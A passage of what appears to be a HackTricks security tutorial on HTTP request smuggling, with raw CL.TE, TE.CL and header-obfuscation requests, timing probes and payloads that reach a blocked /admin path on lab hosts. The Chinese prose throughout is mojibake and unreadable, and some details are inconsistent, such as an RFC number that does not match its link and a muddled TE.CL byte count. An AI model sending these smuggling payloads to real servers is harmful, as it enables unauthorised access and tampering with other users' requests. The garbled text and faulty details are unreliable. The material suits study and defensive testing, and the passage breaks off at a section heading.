# HTTP Request Smuggling / HTTP Desync Attack

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## ä»€ä¹ˆæ˜¯

å½“ **å‰ç«¯ä»£ç†** å’Œ **åç«¯** æœåŠ¡å™¨ä¹‹é—´å‘ç”Ÿ **ä¸åŒæ­¥** æ—¶ï¼Œå…è®¸ **æ”»å‡»è€…** å‘é€ä¸€ä¸ª HTTP **è¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†è¢« **å‰ç«¯** ä»£ç†ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰è§£é‡Šä¸º **å•ä¸ªè¯·æ±‚**ï¼Œè€Œè¢« **åç«¯** æœåŠ¡å™¨è§£é‡Šä¸º **ä¸¤ä¸ªè¯·æ±‚**ã€‚\
è¿™ä½¿å¾—ç”¨æˆ·èƒ½å¤Ÿ **ä¿®æ”¹åˆ°è¾¾åç«¯æœåŠ¡å™¨çš„ä¸‹ä¸€ä¸ªè¯·æ±‚**ã€‚

### ç†è®º

[**RFC è§„èŒƒ (2161)**](https://tools.ietf.org/html/rfc2616)

> å¦‚æœæ”¶åˆ°çš„æ¶ˆæ¯åŒæ—¶åŒ…å« Transfer-Encoding å¤´å­—æ®µå’Œ Content-Length å¤´å­—æ®µï¼Œåˆ™åè€…å¿…é¡»è¢«å¿½ç•¥ã€‚

**Content-Length**

> Content-Length å®ä½“å¤´æŒ‡ç¤ºå‘é€ç»™æ¥æ”¶è€…çš„å®ä½“ä¸»ä½“çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚

**Transfer-Encoding: chunked**

> Transfer-Encoding å¤´æŒ‡å®šç”¨äºå®‰å…¨ä¼ è¾“æœ‰æ•ˆè´Ÿè½½ä¸»ä½“çš„ç¼–ç å½¢å¼ã€‚\
> Chunked æ„å‘³ç€å¤§æ•°æ®ä»¥ä¸€ç³»åˆ—å—çš„å½¢å¼å‘é€ã€‚

### ç°å®

**å‰ç«¯**ï¼ˆè´Ÿè½½å‡è¡¡/åå‘ä»£ç†ï¼‰**å¤„ç†** _**content-length**_ æˆ– _**transfer-encoding**_ å¤´ï¼Œè€Œ **åç«¯** æœåŠ¡å™¨ **å¤„ç†å¦ä¸€ä¸ª**ï¼Œå¯¼è‡´ä¸¤ä¸ªç³»ç»Ÿä¹‹é—´çš„ **ä¸åŒæ­¥**ã€‚\
è¿™å¯èƒ½éå¸¸å…³é”®ï¼Œå› ä¸º **æ”»å‡»è€…å°†èƒ½å¤Ÿå‘åå‘ä»£ç†å‘é€ä¸€ä¸ªè¯·æ±‚**ï¼Œè¯¥è¯·æ±‚å°†è¢« **åç«¯** æœåŠ¡å™¨ **è§£é‡Šä¸ºä¸¤ä¸ªä¸åŒçš„è¯·æ±‚**ã€‚è¿™ç§æŠ€æœ¯çš„ **å±é™©** åœ¨äº **åç«¯** æœåŠ¡å™¨ **å°†è§£é‡Š** **æ³¨å…¥çš„ç¬¬äºŒä¸ªè¯·æ±‚**ï¼Œå°±å¥½åƒå®ƒ **æ¥è‡ªä¸‹ä¸€ä¸ªå®¢æˆ·ç«¯**ï¼Œè€Œè¯¥å®¢æˆ·ç«¯çš„ **çœŸå®è¯·æ±‚** å°†æ˜¯ **æ³¨å…¥è¯·æ±‚** çš„ **ä¸€éƒ¨åˆ†**ã€‚

### ç‰¹ç‚¹

è¯·è®°ä½ï¼Œåœ¨ HTTP ä¸­ **ä¸€ä¸ªæ–°è¡Œå­—ç¬¦ç”± 2 ä¸ªå­—èŠ‚ç»„æˆï¼š**

* **Content-Length**ï¼šæ­¤å¤´ä½¿ç”¨ **åè¿›åˆ¶æ•°å­—** æŒ‡ç¤ºè¯·æ±‚ **ä¸»ä½“** çš„ **å­—èŠ‚æ•°**ã€‚ä¸»ä½“é¢„è®¡åœ¨æœ€åä¸€ä¸ªå­—ç¬¦ç»“æŸï¼Œ**è¯·æ±‚æœ«å°¾ä¸éœ€è¦æ–°è¡Œ**ã€‚
* **Transfer-Encoding:** æ­¤å¤´åœ¨ **ä¸»ä½“** ä¸­ä½¿ç”¨ **åå…­è¿›åˆ¶æ•°å­—** æŒ‡ç¤º **ä¸‹ä¸€ä¸ªå—** çš„ **å­—èŠ‚æ•°**ã€‚**å—** å¿…é¡»ä»¥ **æ–°è¡Œ** ç»“æŸï¼Œä½†æ­¤æ–°è¡Œ **ä¸è®¡å…¥** é•¿åº¦æŒ‡ç¤ºç¬¦ã€‚æ­¤ä¼ è¾“æ–¹æ³•å¿…é¡»ä»¥ **å¤§å°ä¸º 0 çš„å—åè·Ÿ 2 ä¸ªæ–°è¡Œ** ç»“æŸï¼š `0`
* **Connection**ï¼šæ ¹æ®æˆ‘çš„ç»éªŒï¼Œå»ºè®®åœ¨è¯·æ±‚ Smuggling çš„ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­ä½¿ç”¨ **`Connection: keep-alive`**ã€‚

## åŸºæœ¬ç¤ºä¾‹

{% hint style="success" %}
åœ¨å°è¯•ä½¿ç”¨ Burp Suite åˆ©ç”¨æ­¤æ¼æ´æ—¶ï¼Œ**ç¦ç”¨ `Update Content-Length` å’Œ `Normalize HTTP/1 line endings`**ï¼Œå› ä¸ºæŸäº›å·¥å…·æ»¥ç”¨æ–°è¡Œã€å›è½¦å’Œæ ¼å¼é”™è¯¯çš„å†…å®¹é•¿åº¦ã€‚
{% endhint %}

HTTP è¯·æ±‚èµ°ç§æ”»å‡»æ˜¯é€šè¿‡å‘é€æ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚æ¥æ„é€ çš„ï¼Œè¿™äº›è¯·æ±‚åˆ©ç”¨äº†å‰ç«¯å’Œåç«¯æœåŠ¡å™¨åœ¨è§£é‡Š `Content-Length` (CL) å’Œ `Transfer-Encoding` (TE) å¤´æ—¶çš„å·®å¼‚ã€‚è¿™äº›æ”»å‡»å¯ä»¥ä»¥ä¸åŒå½¢å¼è¡¨ç°ï¼Œä¸»è¦ä¸º **CL.TE**ã€**TE.CL** å’Œ **TE.TE**ã€‚æ¯ç§ç±»å‹ä»£è¡¨å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¦‚ä½•ä¼˜å…ˆå¤„ç†è¿™äº›å¤´çš„ç‹¬ç‰¹ç»„åˆã€‚æ¼æ´æºäºæœåŠ¡å™¨ä»¥ä¸åŒæ–¹å¼å¤„ç†ç›¸åŒè¯·æ±‚ï¼Œå¯¼è‡´æ„å¤–å’Œæ½œåœ¨çš„æ¶æ„ç»“æœã€‚

### æ¼æ´ç±»å‹çš„åŸºæœ¬ç¤ºä¾‹

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### CL.TE æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Content-Lengthï¼Œåç«¯ä½¿ç”¨ Transfer-Encodingï¼‰

* **å‰ç«¯ (CL)ï¼š** æ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
* **åç«¯ (TE)ï¼š** æ ¹æ® `Transfer-Encoding` å¤´å¤„ç†è¯·æ±‚ã€‚
* **æ”»å‡»åœºæ™¯ï¼š**
* æ”»å‡»è€…å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå…¶ä¸­ `Content-Length` å¤´çš„å€¼ä¸å®é™…å†…å®¹é•¿åº¦ä¸åŒ¹é…ã€‚
* å‰ç«¯æœåŠ¡å™¨æ ¹æ® `Content-Length` å€¼å°†æ•´ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚
* åç«¯æœåŠ¡å™¨ç”±äº `Transfer-Encoding: chunked` å¤´å°†è¯·æ±‚å¤„ç†ä¸ºåˆ†å—ï¼Œè§£é‡Šå‰©ä½™æ•°æ®ä¸ºä¸€ä¸ªå•ç‹¬çš„åç»­è¯·æ±‚ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL æ¼æ´ï¼ˆå‰ç«¯ä½¿ç”¨ Transfer-Encodingï¼Œåç«¯ä½¿ç”¨ Content-Lengthï¼‰

* **å‰ç«¯ (TE)ï¼š** æ ¹æ® `Transfer-Encoding` å¤´å¤„ç†è¯·æ±‚ã€‚
* **åç«¯ (CL)ï¼š** æ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
* **æ”»å‡»åœºæ™¯ï¼š**
* æ”»å‡»è€…å‘é€ä¸€ä¸ªåˆ†å—è¯·æ±‚ï¼Œå…¶ä¸­å—å¤§å°ï¼ˆ`7b`ï¼‰å’Œå®é™…å†…å®¹é•¿åº¦ï¼ˆ`Content-Length: 4`ï¼‰ä¸ä¸€è‡´ã€‚
* å‰ç«¯æœåŠ¡å™¨éµå¾ª `Transfer-Encoding`ï¼Œå°†æ•´ä¸ªè¯·æ±‚è½¬å‘ç»™åç«¯ã€‚
* åç«¯æœåŠ¡å™¨å°Šé‡ `Content-Length`ï¼Œä»…å¤„ç†è¯·æ±‚çš„åˆå§‹éƒ¨åˆ†ï¼ˆ`7b` å­—èŠ‚ï¼‰ï¼Œå°†å…¶ä½™éƒ¨åˆ†è§†ä¸ºæ„å¤–çš„åç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE æ¼æ´ï¼ˆä¸¤è€…éƒ½ä½¿ç”¨ Transfer-Encodingï¼Œå¸¦æ··æ·†ï¼‰

* **æœåŠ¡å™¨ï¼š** ä¸¤è€…éƒ½æ”¯æŒ `Transfer-Encoding`ï¼Œä½†å¯ä»¥é€šè¿‡æ··æ·†æ¥æ¬ºéª—å…¶ä¸­ä¸€ä¸ªå¿½ç•¥å®ƒã€‚
* **æ”»å‡»åœºæ™¯ï¼š**
* æ”»å‡»è€…å‘é€ä¸€ä¸ªå¸¦æœ‰æ··æ·† `Transfer-Encoding` å¤´çš„è¯·æ±‚ã€‚
* æ ¹æ®å“ªä¸ªæœåŠ¡å™¨ï¼ˆå‰ç«¯æˆ–åç«¯ï¼‰æœªèƒ½è¯†åˆ«æ··æ·†ï¼Œå¯èƒ½ä¼šåˆ©ç”¨ CL.TE æˆ– TE.CL æ¼æ´ã€‚
* è¯·æ±‚ä¸­æœªå¤„ç†çš„éƒ¨åˆ†ï¼Œä½œä¸ºå…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨æ‰€è§ï¼Œæˆä¸ºåç»­è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼Œå¯¼è‡´èµ°ç§ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL åœºæ™¯ï¼ˆå‰ç«¯å’Œåç«¯éƒ½ä½¿ç”¨ Content-Lengthï¼‰ï¼š**

* ä¸¤ä¸ªæœåŠ¡å™¨ä»…æ ¹æ® `Content-Length` å¤´å¤„ç†è¯·æ±‚ã€‚
* æ­¤åœºæ™¯é€šå¸¸ä¸ä¼šå¯¼è‡´èµ°ç§ï¼Œå› ä¸ºä¸¤ä¸ªæœåŠ¡å™¨åœ¨è§£é‡Šè¯·æ±‚é•¿åº¦æ—¶æ˜¯ä¸€è‡´çš„ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL != 0 åœºæ™¯ï¼š**

* æŒ‡çš„æ˜¯ `Content-Length` å¤´å­˜åœ¨ä¸”å€¼ä¸ä¸ºé›¶çš„åœºæ™¯ï¼Œè¡¨æ˜è¯·æ±‚ä¸»ä½“æœ‰å†…å®¹ã€‚
* åœ¨ç†è§£å’Œæ„é€ èµ°ç§æ”»å‡»æ—¶è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒå½±å“æœåŠ¡å™¨ç¡®å®šè¯·æ±‚ç»“æŸçš„æ–¹å¼ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### ç ´å Web æœåŠ¡å™¨

æ­¤æŠ€æœ¯åœ¨å¯ä»¥ **åœ¨è¯»å–åˆå§‹ HTTP æ•°æ®æ—¶ç ´å Web æœåŠ¡å™¨** ä½† **ä¸å…³é—­è¿æ¥** çš„åœºæ™¯ä¸­ä¹Ÿå¾ˆæœ‰ç”¨ã€‚è¿™æ ·ï¼ŒHTTP è¯·æ±‚çš„ **ä¸»ä½“** å°†è¢«è§†ä¸º **ä¸‹ä¸€ä¸ª HTTP è¯·æ±‚**ã€‚

ä¾‹å¦‚ï¼Œå¦‚ [**è¿™ç¯‡æ–‡ç« **](https://mizu.re/post/twisty-python) ä¸­æ‰€è¿°ï¼Œåœ¨ Werkzeug ä¸­å¯ä»¥å‘é€ä¸€äº› **Unicode** å­—ç¬¦ï¼Œè¿™å°†ä½¿æœåŠ¡å™¨ **å´©æºƒ**ã€‚ç„¶è€Œï¼Œå¦‚æœ HTTP è¿æ¥æ˜¯ä½¿ç”¨ **`Connection: keep-alive`** å¤´åˆ›å»ºçš„ï¼Œåˆ™è¯·æ±‚çš„ä¸»ä½“ä¸ä¼šè¢«è¯»å–ï¼Œè¿æ¥ä»å°†ä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œå› æ­¤è¯·æ±‚çš„ **ä¸»ä½“** å°†è¢«è§†ä¸º **ä¸‹ä¸€ä¸ª HTTP è¯·æ±‚**ã€‚

#### é€šè¿‡é€è·³å¤´å¼ºåˆ¶

æ»¥ç”¨é€è·³å¤´ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤ºä»£ç† **åˆ é™¤ Content-Length æˆ– Transfer-Encoding å¤´ï¼Œä»¥ä¾¿å¯ä»¥æ»¥ç”¨ HTTP è¯·æ±‚èµ°ç§**ã€‚
```
Connection: Content-Length
```
For **æœ‰å…³é€è·³å¤´çš„æ›´å¤šä¿¡æ¯** è®¿é—®ï¼š

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## æŸ¥æ‰¾ HTTP è¯·æ±‚èµ°ç§

è¯†åˆ« HTTP è¯·æ±‚èµ°ç§æ¼æ´é€šå¸¸å¯ä»¥é€šè¿‡æ—¶é—´æŠ€æœ¯å®ç°ï¼Œè¿™ä¾èµ–äºè§‚å¯ŸæœåŠ¡å™¨å“åº”è¢«æ“çºµè¯·æ±‚æ‰€éœ€çš„æ—¶é—´ã€‚è¿™äº›æŠ€æœ¯å¯¹äºæ£€æµ‹ CL.TE å’Œ TE.CL æ¼æ´ç‰¹åˆ«æœ‰ç”¨ã€‚é™¤äº†è¿™äº›æ–¹æ³•ï¼Œè¿˜æœ‰å…¶ä»–ç­–ç•¥å’Œå·¥å…·å¯ä»¥ç”¨æ¥å‘ç°æ­¤ç±»æ¼æ´ï¼š

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾ CL.TE æ¼æ´

* **æ–¹æ³•ï¼š**
* å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
* **è§‚å¯Ÿï¼š**
* å‰ç«¯æœåŠ¡å™¨æ ¹æ® `Content-Length` å¤„ç†è¯·æ±‚ï¼Œå¹¶æå‰æˆªæ–­æ¶ˆæ¯ã€‚
* åç«¯æœåŠ¡å™¨æœŸæœ›æ¥æ”¶åˆ†å—æ¶ˆæ¯ï¼Œç­‰å¾…ä¸‹ä¸€ä¸ªä»æœªåˆ°è¾¾çš„å—ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚
* **æŒ‡æ ‡ï¼š**
* å“åº”è¶…æ—¶æˆ–é•¿æ—¶é—´å»¶è¿Ÿã€‚
* ä»åç«¯æœåŠ¡å™¨æ”¶åˆ° 400 Bad Request é”™è¯¯ï¼Œæœ‰æ—¶é™„å¸¦è¯¦ç»†çš„æœåŠ¡å™¨ä¿¡æ¯ã€‚

### ä½¿ç”¨æ—¶é—´æŠ€æœ¯æŸ¥æ‰¾ TE.CL æ¼æ´

* **æ–¹æ³•ï¼š**
* å‘é€ä¸€ä¸ªè¯·æ±‚ï¼Œå¦‚æœåº”ç”¨ç¨‹åºå­˜åœ¨æ¼æ´ï¼Œå°†å¯¼è‡´åç«¯æœåŠ¡å™¨ç­‰å¾…é¢å¤–æ•°æ®ã€‚
*   **ç¤ºä¾‹ï¼š**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
* **è§‚å¯Ÿï¼š**
* å‰ç«¯æœåŠ¡å™¨æ ¹æ® `Transfer-Encoding` å¤„ç†è¯·æ±‚å¹¶è½¬å‘æ•´ä¸ªæ¶ˆæ¯ã€‚
* åç«¯æœåŠ¡å™¨æœŸæœ›æ ¹æ® `Content-Length` æ¥æ”¶æ¶ˆæ¯ï¼Œç­‰å¾…ä»æœªåˆ°è¾¾çš„é¢å¤–æ•°æ®ï¼Œå¯¼è‡´å»¶è¿Ÿã€‚

### æŸ¥æ‰¾æ¼æ´çš„å…¶ä»–æ–¹æ³•

* **å·®å¼‚å“åº”åˆ†æï¼š**
* å‘é€ç•¥æœ‰ä¸åŒç‰ˆæœ¬çš„è¯·æ±‚ï¼Œè§‚å¯ŸæœåŠ¡å™¨å“åº”æ˜¯å¦ä»¥æ„å¤–æ–¹å¼ä¸åŒï¼ŒæŒ‡ç¤ºè§£æå·®å¼‚ã€‚
* **ä½¿ç”¨è‡ªåŠ¨åŒ–å·¥å…·ï¼š**
* åƒ Burp Suite çš„ 'HTTP Request Smuggler' æ‰©å±•å¯ä»¥é€šè¿‡å‘é€å„ç§æ¨¡ç³Šè¯·æ±‚å¹¶åˆ†æå“åº”ï¼Œè‡ªåŠ¨æµ‹è¯•è¿™äº›æ¼æ´ã€‚
* **Content-Length å˜å¼‚æµ‹è¯•ï¼š**
* å‘é€å…·æœ‰ä¸åŒ `Content-Length` å€¼çš„è¯·æ±‚ï¼Œè¿™äº›å€¼ä¸å®é™…å†…å®¹é•¿åº¦ä¸ä¸€è‡´ï¼Œå¹¶è§‚å¯ŸæœåŠ¡å™¨å¦‚ä½•å¤„ç†æ­¤ç±»ä¸åŒ¹é…ã€‚
* **Transfer-Encoding å˜å¼‚æµ‹è¯•ï¼š**
* å‘é€å…·æœ‰æ¨¡ç³Šæˆ–æ ¼å¼é”™è¯¯çš„ `Transfer-Encoding` å¤´çš„è¯·æ±‚ï¼Œå¹¶ç›‘æ§å‰ç«¯å’Œåç«¯æœåŠ¡å™¨å¯¹è¿™äº›æ“æ§çš„ä¸åŒå“åº”ã€‚

### HTTP è¯·æ±‚èµ°ç§æ¼æ´æµ‹è¯•

åœ¨ç¡®è®¤æ—¶é—´æŠ€æœ¯çš„æœ‰æ•ˆæ€§åï¼ŒéªŒè¯å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦å¯ä»¥è¢«æ“çºµè‡³å…³é‡è¦ã€‚ä¸€ç§ç®€å•çš„æ–¹æ³•æ˜¯å°è¯•æ¯’åŒ–æ‚¨çš„è¯·æ±‚ï¼Œä¾‹å¦‚ï¼Œä½¿å¯¹ `/` çš„è¯·æ±‚è¿”å› 404 å“åº”ã€‚ä¹‹å‰åœ¨ [åŸºæœ¬ç¤ºä¾‹](./#basic-examples) ä¸­è®¨è®ºçš„ `CL.TE` å’Œ `TE.CL` ç¤ºä¾‹æ¼”ç¤ºäº†å¦‚ä½•æ¯’åŒ–å®¢æˆ·ç«¯è¯·æ±‚ä»¥å¼•å‘ 404 å“åº”ï¼Œå°½ç®¡å®¢æˆ·ç«¯æ—¨åœ¨è®¿é—®ä¸åŒçš„èµ„æºã€‚

**å…³é”®è€ƒè™‘äº‹é¡¹**

åœ¨é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æµ‹è¯•è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œè¯·è®°ä½ï¼š

* **ç‹¬ç«‹ç½‘ç»œè¿æ¥ï¼š** â€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”é€šè¿‡ç‹¬ç«‹çš„ç½‘ç»œè¿æ¥å‘é€ã€‚å¯¹ä¸¤è€…ä½¿ç”¨ç›¸åŒè¿æ¥å¹¶ä¸èƒ½éªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
* **ä¸€è‡´çš„ URL å’Œå‚æ•°ï¼š** åŠ›æ±‚å¯¹ä¸¤ä¸ªè¯·æ±‚ä½¿ç”¨ç›¸åŒçš„ URL å’Œå‚æ•°åç§°ã€‚ç°ä»£åº”ç”¨ç¨‹åºé€šå¸¸æ ¹æ® URL å’Œå‚æ•°å°†è¯·æ±‚è·¯ç”±åˆ°ç‰¹å®šçš„åç«¯æœåŠ¡å™¨ã€‚åŒ¹é…è¿™äº›å¯ä»¥å¢åŠ ä¸¤ä¸ªè¯·æ±‚ç”±åŒä¸€æœåŠ¡å™¨å¤„ç†çš„å¯èƒ½æ€§ï¼Œè¿™æ˜¯æˆåŠŸæ”»å‡»çš„å‰æã€‚
* **æ—¶é—´å’Œç«äº‰æ¡ä»¶ï¼š** â€œæ­£å¸¸â€è¯·æ±‚æ—¨åœ¨æ£€æµ‹â€œæ”»å‡»â€è¯·æ±‚çš„å¹²æ‰°ï¼Œä¸å…¶ä»–å¹¶å‘åº”ç”¨è¯·æ±‚ç«äº‰ã€‚å› æ­¤ï¼Œåœ¨â€œæ”»å‡»â€è¯·æ±‚åç«‹å³å‘é€â€œæ­£å¸¸â€è¯·æ±‚ã€‚ç¹å¿™çš„åº”ç”¨ç¨‹åºå¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ä»¥ç¡®è®¤æ¼æ´ã€‚
* **è´Ÿè½½å‡è¡¡æŒ‘æˆ˜ï¼š** ä½œä¸ºè´Ÿè½½å‡è¡¡å™¨çš„å‰ç«¯æœåŠ¡å™¨å¯èƒ½ä¼šå°†è¯·æ±‚åˆ†é…åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœâ€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚æœ€ç»ˆè½åœ¨ä¸åŒçš„ç³»ç»Ÿä¸Šï¼Œæ”»å‡»å°†ä¸ä¼šæˆåŠŸã€‚è¿™ä¸ªè´Ÿè½½å‡è¡¡æ–¹é¢å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•ä»¥ç¡®è®¤æ¼æ´ã€‚
* **æ„å¤–ç”¨æˆ·å½±å“ï¼š** å¦‚æœæ‚¨çš„æ”»å‡»æ— æ„ä¸­å½±å“äº†å¦ä¸€ä¸ªç”¨æˆ·çš„è¯·æ±‚ï¼ˆä¸æ˜¯æ‚¨å‘é€çš„â€œæ­£å¸¸â€è¯·æ±‚ä»¥è¿›è¡Œæ£€æµ‹ï¼‰ï¼Œè¿™è¡¨æ˜æ‚¨çš„æ”»å‡»å½±å“äº†å¦ä¸€ä¸ªåº”ç”¨ç”¨æˆ·ã€‚æŒç»­æµ‹è¯•å¯èƒ½ä¼šå¹²æ‰°å…¶ä»–ç”¨æˆ·ï¼Œå› æ­¤éœ€è¦è°¨æ…å¤„ç†ã€‚

## æ»¥ç”¨ HTTP è¯·æ±‚èµ°ç§

### é€šè¿‡ HTTP è¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨

æœ‰æ—¶ï¼Œå‰ç«¯ä»£ç†ä¼šå®æ–½å®‰å…¨æªæ–½ï¼Œå®¡æŸ¥ä¼ å…¥è¯·æ±‚ã€‚ç„¶è€Œï¼Œè¿™äº›æªæ–½å¯ä»¥é€šè¿‡åˆ©ç”¨ HTTP è¯·æ±‚èµ°ç§æ¥è§„é¿ï¼Œä»è€Œå…è®¸æœªç»æˆæƒè®¿é—®å—é™ç«¯ç‚¹ã€‚ä¾‹å¦‚ï¼Œè®¿é—® `/admin` å¯èƒ½åœ¨å¤–éƒ¨è¢«ç¦æ­¢ï¼Œå‰ç«¯ä»£ç†ç§¯æé˜»æ­¢æ­¤ç±»å°è¯•ã€‚ç„¶è€Œï¼Œè¿™ä¸ªä»£ç†å¯èƒ½å¿½ç•¥äº†åœ¨èµ°ç§çš„ HTTP è¯·æ±‚ä¸­åµŒå…¥çš„è¯·æ±‚ï¼Œä»è€Œç•™ä¸‹äº†ç»•è¿‡è¿™äº›é™åˆ¶çš„æ¼æ´ã€‚

è€ƒè™‘ä»¥ä¸‹ç¤ºä¾‹ï¼Œè¯´æ˜å¦‚ä½•ä½¿ç”¨ HTTP è¯·æ±‚èµ°ç§ç»•è¿‡å‰ç«¯å®‰å…¨æ§åˆ¶ï¼Œç‰¹åˆ«é’ˆå¯¹é€šå¸¸ç”±å‰ç«¯ä»£ç†ä¿æŠ¤çš„ `/admin` è·¯å¾„ï¼š

**CL.TE ç¤ºä¾‹**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
åœ¨ CL.TE æ”»å‡»ä¸­ï¼Œåˆå§‹è¯·æ±‚åˆ©ç”¨äº† `Content-Length` å¤´ï¼Œè€Œéšåçš„åµŒå…¥è¯·æ±‚åˆ™ä½¿ç”¨ `Transfer-Encoding: chunked` å¤´ã€‚å‰ç«¯ä»£ç†å¤„ç†åˆå§‹çš„ `POST` è¯·æ±‚ï¼Œä½†æœªèƒ½æ£€æŸ¥åµŒå…¥çš„ `GET /admin` è¯·æ±‚ï¼Œä»è€Œå…è®¸æœªç»æˆæƒè®¿é—® `/admin` è·¯å¾„ã€‚

**TE.CL ç¤ºä¾‹**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
ç›¸åï¼Œåœ¨TE.CLæ”»å‡»ä¸­ï¼Œåˆå§‹çš„`POST`è¯·æ±‚ä½¿ç”¨`Transfer-Encoding: chunked`ï¼Œè€Œåç»­åµŒå…¥çš„è¯·æ±‚åˆ™åŸºäº`Content-Length`å¤´è¿›è¡Œå¤„ç†ã€‚ä¸CL.TEæ”»å‡»ç±»ä¼¼ï¼Œå‰ç«¯ä»£ç†å¿½è§†äº†è¢«èµ°ç§çš„`GET /admin`è¯·æ±‚ï¼Œæ— æ„ä¸­æˆäºˆäº†å¯¹å—é™`/admin`è·¯å¾„çš„è®¿é—®ã€‚

### æ­ç¤ºå‰ç«¯è¯·æ±‚é‡å†™ <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

